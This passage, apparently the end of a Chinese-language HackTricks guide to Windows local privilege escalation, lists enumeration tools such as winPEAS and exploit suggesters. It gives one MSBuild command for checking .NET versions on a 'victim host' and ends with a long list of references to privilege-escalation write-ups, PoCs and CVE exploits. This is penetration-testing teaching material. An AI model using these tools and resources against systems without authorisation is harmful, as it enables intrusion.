[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 检查错误配置（github 上有预编译的可执行文件）。不推荐使用。在 Win10 上运行效果不佳。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的错误配置（来自 python 的 exe）。不推荐使用。在 Win10 上运行效果不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 根据这篇文章创建的工具（正常运行不需要 accesschk，但也可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的 exploits（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的 exploits（本地 Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确版本的 .NET 编译该项目（[参见这里](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上安装的 .NET 版本，可以运行：

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows 权限提升基础](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [利用脆弱的文件夹权限提升权限](http://www.greyhathacker.net/?p=738)
- [3] [Windows 权限提升 - 速查表](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux 本地权限提升 Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows 攻击：AT 是新潮流 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [权限提升 - Windows - OSCP 完整指南](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 权限提升 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 权限提升指南](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows 权限提升检查清单](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows 权限提升](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [面向 Pentesters 的 Windows 权限提升方法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo：通过 SMTP 发送 Word VBA macro 钓鱼邮件 → hMailServer 凭据解密 → 利用 Veeam CVE-2023-27532 提升至 SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper：格式字符串 leak + 栈 BOF → VirtualAlloc ROP (RCE) 和内核 token 窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – 追踪 Silver Fox：内核阴影中的猫鼠游戏](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA 系统中存在特权文件系统漏洞](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [符号链接测试工具 – CreateSymlink 用法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [回到过去的链接：滥用 Windows 符号链接](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF 移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js 信任陷阱：Windows 上危险的模块解析](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js 模块：从 `node_modules` 文件夹加载](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json：`optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ 检查清单挑战，已解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 函数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - 劫持服务二进制文件](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [与 Microslop 一起参加 Pwn2Own：串联 CLDFLT 和 DirectX 内核竞态条件以实现 Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [一枚 I/O Ring 统御一切：Windows 11 上完整的读写 Exploit 原语](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [滥用任意文件删除来提升权限及其他实用技巧](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs Exploit 代码](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS 攻击第二部分：CVE-2020-1013，一例 Windows 10 本地权限提升 1-Day 漏洞](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7：探索 Credential Manager 和 Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos 基于资源的约束委派：映像变更如何导致权限提升](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - 从 Windows 10 SSH Agent 提取 SSH 私钥](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 将企业更新服务器变成后门工厂 (0_o) – 第一部分](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 将企业更新服务器变成后门工厂 (0_o) – 第二部分](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer 文件夹删除权限提升漏洞](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall：循迹回溯至 NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services 共享内存偏移量权限提升安全公告](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
